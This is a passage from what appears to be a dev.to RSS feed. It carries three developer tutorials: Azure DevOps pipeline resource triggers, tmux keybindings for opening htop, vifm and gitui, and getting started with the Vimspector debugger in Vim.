  &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;pipeline&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;PipelineA&lt;/span&gt;  &lt;span class="c1"&gt;# identifier for the resource used in pipeline resource variables.&lt;/span&gt;
    &lt;span class="na"&gt;project&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ProjectA&lt;/span&gt;    &lt;span class="c1"&gt;# project for the source; optional for current project.&lt;/span&gt;
    &lt;span class="na"&gt;source&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;PipelineA&lt;/span&gt;    &lt;span class="c1"&gt;# name of the pipeline that produces an artifact.&lt;/span&gt;
    &lt;span class="na"&gt;trigger&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;             &lt;span class="c1"&gt;# triggers are not enabled by default unless you add trigger section to the resource.&lt;/span&gt;
      &lt;span class="na"&gt;branches&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;          &lt;span class="c1"&gt;# branch conditions to filter the events, optional; Defaults to all branches.&lt;/span&gt;
        &lt;span class="na"&gt;include&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;         &lt;span class="c1"&gt;# branches to consider the trigger events, optional; Defaults to all branches.&lt;/span&gt;
        &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="s"&gt;main&lt;/span&gt;
&lt;span class="c1"&gt;# ------------------------------------------&lt;/span&gt;

&lt;span class="na"&gt;stages&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
&lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;stage&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Consume_Artifact&lt;/span&gt;
  &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Consume Artifact A&lt;/span&gt;

  &lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;job&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Consume&lt;/span&gt;
    &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Consume&lt;/span&gt;
    &lt;span class="na"&gt;pool&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Azure Pipelines&lt;/span&gt;
      &lt;span class="na"&gt;vmImage&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;windows-2019&lt;/span&gt;

    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;task&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;PowerShell@2&lt;/span&gt;
      &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;Information'&lt;/span&gt;
      &lt;span class="na"&gt;inputs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="na"&gt;targetType&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;inline&lt;/span&gt;
        &lt;span class="na"&gt;script&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="pi"&gt;|&lt;/span&gt;
          &lt;span class="s"&gt;Write-output "This pipeline has been triggered by: $(resources.pipeline.PipelineA.pipelineName)"&lt;/span&gt;

    &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;download&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;PipelineA&lt;/span&gt;
      &lt;span class="na"&gt;artifact&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;ArtifactA'&lt;/span&gt;

    &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;task&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;PowerShell@2&lt;/span&gt;
      &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;Get-Content&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;MyConfig.txt'&lt;/span&gt;
      &lt;span class="na"&gt;inputs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="na"&gt;targetType&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;inline&lt;/span&gt;
        &lt;span class="na"&gt;script&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="pi"&gt;|&lt;/span&gt;
          &lt;span class="s"&gt;Get-Content -path $(Pipeline.Workspace)/PipelineA/ArtifactA/MyConfig.txt&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; It is important to note that we have to configure &lt;strong&gt;ProjectB&lt;/strong&gt; pipeline settings to allow it to connect to &lt;strong&gt;ProjectA&lt;/strong&gt; in order to download the artifact that was produced.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--H8lMF0IT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/pipesettings.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--H8lMF0IT--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/pipesettings.png" alt="pipesettings"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Metadata for a pipeline resource, are available as predefined variables that we can reference, as you can see from our &lt;strong&gt;PipelineB.yml&lt;/strong&gt; in the following code snippet:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="c1"&gt;## code/PipelineB.yml#L29-L30&lt;/span&gt;
&lt;span class="na"&gt;script&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="pi"&gt;|&lt;/span&gt;
  &lt;span class="s"&gt;Write-output "This pipeline has been triggered by: $(resources.pipeline.PipelineA.pipelineName)"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Predefined pipeline resource variables:&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;resources.pipeline.&amp;lt;Alias&amp;gt;.projectID
resources.pipeline.&amp;lt;Alias&amp;gt;.pipelineName
resources.pipeline.&amp;lt;Alias&amp;gt;.pipelineID
resources.pipeline.&amp;lt;Alias&amp;gt;.runName
resources.pipeline.&amp;lt;Alias&amp;gt;.runID
resources.pipeline.&amp;lt;Alias&amp;gt;.runURI
resources.pipeline.&amp;lt;Alias&amp;gt;.sourceBranch
resources.pipeline.&amp;lt;Alias&amp;gt;.sourceCommit
resources.pipeline.&amp;lt;Alias&amp;gt;.sourceProvider
resources.pipeline.&amp;lt;Alias&amp;gt;.requestedFor
resources.pipeline.&amp;lt;Alias&amp;gt;.requestedForID
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now when we trigger and run &lt;strong&gt;PipelineA&lt;/strong&gt; in &lt;strong&gt;ProjectA&lt;/strong&gt;, it will automatically create our &lt;strong&gt;ArtifactA&lt;/strong&gt; and also after completion &lt;strong&gt;PipelineB&lt;/strong&gt; in &lt;strong&gt;ProjectB&lt;/strong&gt; will be automatically triggered and also download and consume &lt;strong&gt;ArtifactA&lt;/strong&gt; that was created in &lt;strong&gt;ProjectA&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gUGMF_1z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/results.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gUGMF_1z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/results.png" alt="results"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Also note that triggers for resources are created based on the default branch configuration of our YAML, which is master. However, if we want to configure resource triggers from a different branch, we will need to change the default branch for the pipeline. For more information have a look at &lt;a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/process/resources?view=azure-devops&amp;amp;tabs=example#default-branch-for-triggers"&gt;Default branch for triggers&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I hope you have enjoyed this post and have learned something new. You can also find the code samples used in this blog post on my &lt;a href="https://github.com/Pwd9000-ML/blog-devto/tree/master/posts/DevOps-Pipeline-from-Pipeline/code"&gt;Github&lt;/a&gt; page. ❤️&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#author"&gt;
  &lt;/a&gt;
  &lt;em&gt;Author&lt;/em&gt;
&lt;/h3&gt;

&lt;p&gt;Marcel.L - &lt;a href="mailto:pwd9000@hotmail.co.uk"&gt;pwd9000@hotmail.co.uk&lt;/a&gt;&lt;/p&gt;

</description>
      <category>tutorial</category>
      <category>azure</category>
      <category>productivity</category>
      <category>devops</category>
    </item>
    <item>
      <title>🚀 boost your tmux productivity with 🎯 targeted</title>
      <author>Waylon Walker</author>
      <pubDate>Sat, 07 Aug 2021 14:03:04 +0000</pubDate>
      <link>https://dev.to/waylonwalker/boost-your-tmux-productivity-with-targeted-4b17</link>
      <guid>https://dev.to/waylonwalker/boost-your-tmux-productivity-with-targeted-4b17</guid>
      <description>&lt;p&gt;Hold on to your hats folks, we are going to start adding some rocket fuel to your tmux.  We are going to configure tmux to open applications you need on a regular basis  in an instant.&lt;/p&gt;

&lt;p&gt;Scripting tmux to open up specific applications can be intimidating your first time.  It can be tricky to get it to start in the right directory.  If you are trying to assign applications to a keybinding it can be easy to mess up and have weird things happen every time your &lt;code&gt;~/.tmux.conf&lt;/code&gt; gets sourced.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#open-htop-in-an-above-split"&gt;
  &lt;/a&gt;
  Open htop in an above split
&lt;/h2&gt;

&lt;p&gt;I used this one for a number of years to take a quick peek into my systems performance while a memory intensive task was running.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;bind&lt;/span&gt; &lt;span class="nt"&gt;-n&lt;/span&gt; M-t split-window htop &lt;span class="se"&gt;\;&lt;/span&gt; swap-pane &lt;span class="nt"&gt;-U&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;🗒️ note that the &lt;code&gt;swap-pane -U&lt;/code&gt; will make the htop split active immediately&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#open-htop-in-a-popup"&gt;
  &lt;/a&gt;
  Open htop in a popup
&lt;/h2&gt;

&lt;p&gt;With the new tmux popup windows I really like the flow of just peeking at htop in a popup and jumping back into what I was doing.  It can have a more consistent look, and not mess with the window layouts.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;bind&lt;/span&gt; &lt;span class="nt"&gt;-n&lt;/span&gt; M-t popup &lt;span class="nt"&gt;-E&lt;/span&gt; &lt;span class="nt"&gt;-h&lt;/span&gt; 95% &lt;span class="nt"&gt;-w&lt;/span&gt; 95% &lt;span class="nt"&gt;-x&lt;/span&gt; 100% &lt;span class="s2"&gt;"htop"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#open-an-application-in-the-current-directory"&gt;
  &lt;/a&gt;
  Open an application in the current directory
&lt;/h2&gt;

&lt;p&gt;One thing that can be tricky is getting apps that need to be in a specific directory started in the directory that you want. Here are two examples I use to open &lt;code&gt;vifm&lt;/code&gt; or &lt;code&gt;gitui&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;bind&lt;/span&gt; &lt;span class="nt"&gt;-n&lt;/span&gt; M-e split-window &lt;span class="nt"&gt;-c&lt;/span&gt; &lt;span class="s1"&gt;'#{pane_current_path}'&lt;/span&gt; vifm &lt;span class="nb"&gt;.&lt;/span&gt; .&lt;span class="se"&gt;\;&lt;/span&gt; resize-pane &lt;span class="nt"&gt;-Z&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nb"&gt;bind &lt;/span&gt;C-k split-window &lt;span class="nt"&gt;-c&lt;/span&gt; &lt;span class="s1"&gt;'#{pane_current_path}'&lt;/span&gt; &lt;span class="s1"&gt;'gitui'&lt;/span&gt;&lt;span class="se"&gt;\;&lt;/span&gt; resize-pane &lt;span class="nt"&gt;-Z&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;🗒️ note that &lt;code&gt;split-window&lt;/code&gt; takes in a -c flag before the application you&lt;br&gt;
want to run to specify the startup directory.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#open-a-popup-in-a-specific-directory"&gt;
  &lt;/a&gt;
  Open a popup in a specific directory
&lt;/h2&gt;

&lt;p&gt;I've been converted over to using popups for these as well.  I'll admit that the workflow of creating a new full screen window may have been better, but this can be a bit less jarring, espessially if you have anyone following along with what you are doing.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;bind&lt;/span&gt; &lt;span class="nt"&gt;-n&lt;/span&gt; M-e display-popup &lt;span class="nt"&gt;-d&lt;/span&gt; &lt;span class="s1"&gt;'#{pane_current_path}'&lt;/span&gt; &lt;span class="nt"&gt;-E&lt;/span&gt; vifm
&lt;span class="nb"&gt;bind &lt;/span&gt;C-k display-popup &lt;span class="nt"&gt;-d&lt;/span&gt; &lt;span class="s1"&gt;'#{pane_current_path}'&lt;/span&gt; &lt;span class="nt"&gt;-E&lt;/span&gt; &lt;span class="s1"&gt;'gitui'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;for more information on how I navigate tmux, check out this full post&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Also check out the full YouTube&lt;br&gt;
&lt;a href="https://www.youtube.com/playlist?list=PLTRNG6WIHETB4reAxbWza3CZeP9KL6B"&gt;tmux-playlist&lt;/a&gt;&lt;br&gt;
to see all of the videos in this series.&lt;/p&gt;

</description>
      <category>cli</category>
      <category>linux</category>
      <category>tmux</category>
    </item>
    <item>
      <title>Debugging in Vim with Vimspector</title>
      <author>Igor Irianto</author>
      <pubDate>Sat, 07 Aug 2021 13:57:58 +0000</pubDate>
      <link>https://dev.to/iggredible/debugging-in-vim-with-vimspector-4n0m</link>
      <guid>https://dev.to/iggredible/debugging-in-vim-with-vimspector-4n0m</guid>
      <description>&lt;h1&gt;
  &lt;a href="#debugging-in-vim-with-vimspector"&gt;
  &lt;/a&gt;
  Debugging in Vim with Vimspector
&lt;/h1&gt;

&lt;p&gt;Vimspector is a powerful graphical debugger plugin for Vim. However, it also will take you a while to get started. In this article, I will show you how to use Vimspector to debug:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A Node file.&lt;/li&gt;
&lt;li&gt;Client-side app using Chrome.&lt;/li&gt;
&lt;li&gt;Jest testing.&lt;/li&gt;
&lt;li&gt;An Express app.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Both their &lt;a href="https://github.com/puremourning/vimspector"&gt;Github page&lt;/a&gt; and their &lt;a href="https://puremourning.github.io/vimspector-web/"&gt;website&lt;/a&gt; are very comprehensive. I would suggest you read them when you have the chance!&lt;/p&gt;

&lt;p&gt;Much content found in this article can be found inside the Vimspector websites. However, when I was reading them, I was overwhelmed by the sheer amount of the information. This article serves as a bridge to get you started as early as possible. I think it is beneficial to get our hands dirty early-on. Once you start using it, reading the docs becomes clearer. Although I am using the Javascript ecosystem as examples (backend, frontend, testing), you should be able to apply the same concept to any language of your choice.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#requirements"&gt;
  &lt;/a&gt;
  Requirements
&lt;/h2&gt;

&lt;p&gt;At the time of this writing, I am using Vim 8.2 on MacOS Catalina. This guide should work with any OS (with appropriate modifications). The Vimspector Github page though, recommends you to have either Vim 8.2 or NeoVim 0.4.3. You also need to have Python 3.6 or up.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#quick-overview"&gt;
  &lt;/a&gt;
  Quick Overview
&lt;/h2&gt;

&lt;p&gt;So what is Vimspector? How does it work?&lt;/p&gt;

&lt;p&gt;Vimspector is not a universal language debugger. It technically does not handle the debugging. Think of it like a middle-man that facilitates communicating with the debugger for your language-of-choice. It relies on specific gadgets depending on what language you are working with. So if you want to debug a node application, use the &lt;code&gt;vscode-node-debug2&lt;/code&gt; gadget. If you want to debug a go app, use &lt;code&gt;vscode-go&lt;/code&gt; gadget. If you want to debug a client-side JS app, use &lt;code&gt;debugger-for-chrome&lt;/code&gt; gadget.&lt;/p&gt;

&lt;p&gt;Different languages have different debuggers. Some have built-in debuggers while some use external libraries for debugging. If we want to integrate multiple languages into our favorite editors / IDEs, it could get messy. A Python debugger communicates differently from a Node debugger. A Node debugger behaves differently from a front-end JS debugger via Chrome. If you're a Ruby / Javascript developer, you could technically have a Ruby and Node debuggers installed in your editor / IDE. But these two debuggers probably have different protocols and exhibit different behaviors. The more languages / environments you deal with, the more the complexity increases.&lt;/p&gt;

&lt;p&gt;So having different language environments to debug can get messy. To reconcile these differences, we need to bridge the gap between language X debugger and our editor / IDE - we need an abstract protocol. This protocol is known as Debug Adapter Protocol (DAP). DAP was originally created by the VSCode team. But luckily for us, they decided to make it (somewhat) editor agnostic, so developers can use it for other editors / IDEs. Vimspector is the result of DAP development for the Vim editor. For a list of tools that support DAP, check out this page: &lt;a href="https://microsoft.github.io/debug-adapter-protocol/implementors/tools/"&gt;Tools Supporting the DAP&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Although not required readings, but when you have the time, I would strongly recommend you to look into these pages to get a better understanding on DAP:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://microsoft.github.io/debug-adapter-protocol/implementors/adapters/"&gt;Debug Adapters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://microsoft.github.io/debug-adapter-protocol/overview"&gt;DAP Overview&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.visualstudio.com/docs/editor/debugging"&gt;VSCode Debugging&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Well, enough theory - let's get started with an actual example!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#getting-started"&gt;
  &lt;/a&gt;
  Getting started
&lt;/h2&gt;

&lt;p&gt;To get started, install Vimspector if you haven't. Follow the &lt;a href="https://github.com/puremourning/vimspector#installation"&gt;Vimspector installation guide&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For me, I used &lt;a href="https://github.com/junegunn/vim-plug"&gt;vim-plug&lt;/a&gt;. All I did was add the following in my vimrc's list of plugins:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Plug 'puremourning/vimspector'
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I then sourced my vimrc and ran &lt;code&gt;:PlugInstall&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#examples"&gt;
  &lt;/a&gt;
  Examples
&lt;/h2&gt;

&lt;p&gt;The fastest way to learn a new skill is to jump into it and learn it along the way. You may have a lot of questions right now, but once you see how it works, by the end of this article, I hope that some of your questions will be answered.&lt;/p&gt;

&lt;p&gt;Let's go through the node example.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#debugging-a-node-app"&gt;
  &lt;/a&gt;
  Debugging a node app
&lt;/h3&gt;

&lt;p&gt;The Vimspector plugin itself already comes with examples. Go to the directory where Vim saves your Vimspector plugin. I am using vim-plugged, so my plugins are installed inside the &lt;code&gt;plugged/&lt;/code&gt; directory. In my case, the directory is in &lt;code&gt;~/.vim/plugged/vimspector/&lt;/code&gt;. Yours might be in a different location, depending on your plugin manager and your system. Once you find them, from the &lt;code&gt;vimspector/&lt;/code&gt; directory, go to the &lt;code&gt;/support/test/&lt;/code&gt; directory. Inside this directory, you will find different examples that I also strongly encourage you to check out once you're done reading this article.&lt;/p&gt;

&lt;p&gt;Since this section is about debugging a node app, let's check out the node directory.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;cd node/
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Inside, at the time of this writing, you should find a directory named &lt;code&gt;simple/&lt;/code&gt;. Go there and you'll see a &lt;code&gt;simple.js&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Before we debug this file, there are at least two requirements to debug with Vimspector: &lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;A relevant gadget.&lt;/li&gt;
&lt;li&gt;A Vimspector config file.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;A gadget is a debug adapter (like the ones listed in &lt;a href="https://microsoft.github.io/debug-adapter-protocol/implementors/adapters/"&gt;Microsoft's Debug Adapters page&lt;/a&gt;). Since we are debugging a node app, we need a node adapter. This node adapter will relay messages between NodeJS and the abstract protocol DAP.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(By the way, before installing the node adapter, per &lt;a href="https://github.com/puremourning/vimspector#javascript-typescript-etc"&gt;Vimspector's site&lt;/a&gt;, you need to be using a Node version between 6 and 12).&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;For the first requirement, to install a node adapter, from Vim, run &lt;code&gt;:VimspectorInstall vscode-node-debug2&lt;/code&gt;.You need a different gadget when you are debugging a different language/environment. If you need to debug a Python file, you have to install a python gadget. If you are debugging a Go file, you have to install a Go gadget. Since we are debugging a node app, we need to install a node gadget. For a list of gadgets, check out this section from the Vimspector Github page: &lt;a href="https://github.com/puremourning/vimspector#supported-languages"&gt;Supported Languages&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For the second requirement, the &lt;code&gt;.vimspector.json&lt;/code&gt; file is conveniently already located at the root of the project (inside &lt;code&gt;simple/&lt;/code&gt;). If you check the hidden files of the &lt;code&gt;vimspector/support/test/simple/&lt;/code&gt; directory, there should already be one &lt;code&gt;.vimspector.json&lt;/code&gt; file available, so you don't need to do anything. Keep in mind that when you are inspecting your own project, remember to create your own vimspector file.&lt;/p&gt;

&lt;p&gt;With those two requirements in place, let's debug.&lt;/p&gt;

&lt;p&gt;Vimspector offers many commands and shortcuts. Using them all when you're starting can be overwhelming. I found that the following are sufficient to get started with. Below are some of my vimrc vimspector shortcuts:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nnoremap &amp;lt;Leader&amp;gt;dd :call vimspector#Launch()&amp;lt;CR&amp;gt;
nnoremap &amp;lt;Leader&amp;gt;de :call vimspector#Reset()&amp;lt;CR&amp;gt;
nnoremap &amp;lt;Leader&amp;gt;dc :call vimspector#Continue()&amp;lt;CR&amp;gt;

nnoremap &amp;lt;Leader&amp;gt;dt :call vimspector#ToggleBreakpoint()&amp;lt;CR&amp;gt;
nnoremap &amp;lt;Leader&amp;gt;dT :call vimspector#ClearBreakpoints()&amp;lt;CR&amp;gt;

nmap &amp;lt;Leader&amp;gt;dk &amp;lt;Plug&amp;gt;VimspectorRestart
nmap &amp;lt;Leader&amp;gt;dh &amp;lt;Plug&amp;gt;VimspectorStepOut
nmap &amp;lt;Leader&amp;gt;dl &amp;lt;Plug&amp;gt;VimspectorStepInto
nmap &amp;lt;Leader&amp;gt;dj &amp;lt;Plug&amp;gt;VimspectorStepOver
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Feel free to steal what I have or make your own. Vimspector also comes with a set of shortcuts called the &lt;a href="https://github.com/puremourning/vimspector#human-mode"&gt;human-mode mapping&lt;/a&gt;. If you're used to VSCode debugging shortcut, you may feel more at home with them.&lt;/p&gt;

&lt;p&gt;Finally, let's open &lt;code&gt;simple.js&lt;/code&gt;. It should look something like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var msg = 'Hello, world!'

var obj = {
  test: 'testing',
  toast: function() {
    return 'toasty' + this.test;
  }
}

console.log( "OK stuff happened " + obj.toast() )
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To launch vimspector, run the launch command. Press &lt;code&gt;&amp;lt;Leader&amp;gt;dd&lt;/code&gt; (&lt;code&gt;:call vimsepctor#Launch()&lt;/code&gt;).  You should see a Vimspector window. Pretty cool! &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--QLop98Gq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5c5jkjd6awnktzqis1cn.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--QLop98Gq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5c5jkjd6awnktzqis1cn.png" alt="Vimspector layout"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;There should be 6 different windows displayed - depending on your Vim orientation, you may see them in different order. If you have never used a debugger before, don't feel intimidated. You'll get used to some of them after playing with them for a while. To exit Vimspector, press &lt;code&gt;&amp;lt;Leader&amp;gt;de&lt;/code&gt; (&lt;code&gt;:call vimspector#Reset()&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;By the way, there will be some prompts on the bottom of the windows when you launch vimspector, asking for something like &lt;code&gt;...Break on Uncaught Exceptions?&lt;/code&gt;. I usually pressed &lt;code&gt;N&lt;/code&gt;. If you don't want to get prompted all the time, add these in your vimspector.json file inside the &lt;code&gt;"run": { ...&lt;/code&gt; block:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;  ...
  "breakpoints": {
    "exception": {
      "all": "N",
      "uncaught": "N"
    }
  },
  ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;My full vimspector json (so you can just copy paste it) for this file looks like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
  "configurations": {
    "run": {
      "adapter": "vscode-node",
      "breakpoints": {
        "exception": {
          "all": "N",
          "uncaught": "N"
        }
      },
      "configuration": {
        "request": "launch",
        "protocol": "auto",
        "stopOnEntry": true,
        "console": "integratedTerminal",
        "program": "${workspaceRoot}/simple.js",
        "cwd": "${workspaceRoot}"
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Back to the debugging, start the vimspector again (&lt;code&gt;&amp;lt;Leader&amp;gt;dd&lt;/code&gt;). Since we have &lt;code&gt;stepOnEntry&lt;/code&gt; to be &lt;code&gt;true&lt;/code&gt; in the Vimspector json file, Vimspector will stop on the first line even though you haven't marked a breakpoint.&lt;/p&gt;

&lt;p&gt;To traverse through the file, you can either:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Step out (steps out of the scope)&lt;/li&gt;
&lt;li&gt;Step into (steps into the function scope)&lt;/li&gt;
&lt;li&gt;Step over (steps to the next line, in scope)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here are the key maps that I use. Note that I use &lt;code&gt;hlj&lt;/code&gt; keys similar to the Vim movement keys.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
